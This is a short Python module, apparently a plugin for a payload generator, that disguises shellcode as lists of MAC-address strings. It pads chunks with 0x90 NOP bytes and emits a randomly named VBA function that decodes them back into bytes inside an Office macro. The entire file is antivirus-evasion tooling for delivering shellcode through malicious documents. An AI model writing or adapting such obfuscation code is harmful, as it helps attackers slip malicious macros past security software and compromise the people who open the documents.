import random
import string

class MACObfuscate:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
Private Function {name}(addresses)
    Dim arrayLength as Long
    Dim outArray() As Byte
    Dim octets() As string

    arrayLength = UBound(addresses) - LBound(addresses) + 1
    Redim outArray(arrayLength * 6)
    Dim i As Long
    For i=LBound(addresses) To UBound(addresses) - 1
        octets = Split(addresses(i), "-")
        For j=LBound(octets) To UBound(octets)
            outArray(i*6 + j) = CLng("&h" & octets(j))
        Next j
    Next i

    {name} = outArray
End Function
""".format(name = self.name)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')